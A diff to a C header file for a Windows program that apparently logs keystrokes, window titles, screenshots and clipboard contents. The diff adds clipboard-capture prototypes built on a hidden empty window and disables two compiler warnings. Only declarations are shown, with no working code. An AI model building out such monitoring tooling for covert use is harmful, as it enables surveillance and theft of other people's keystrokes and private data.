@@ -1,5 +1,6 @@
 #pragma once
-
+#pragma warning(disable: 4820)
+#pragma warning(disable: 5045)
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <tlhelp32.h>
@@ -18,7 +19,14 @@ VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, 
 VOID LogvKey(INT vKey, INT MODE);
 VOID GetUsernameOfForegroundWindow(LPSTR username, DWORD foregroundWindowPID);
 VOID GetWindowTitle(HWND hwnd);
+
+//Screenshot
 VOID TakeScreenshot(void);
+
+//Clipboard
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
+WNDCLASSEXA CreateEmptyClassWindow(void);
+HWND CreateEmptyWindow(void);
 
 //log
 VOID log(void *toLog, int MODE, BOOL putDate);
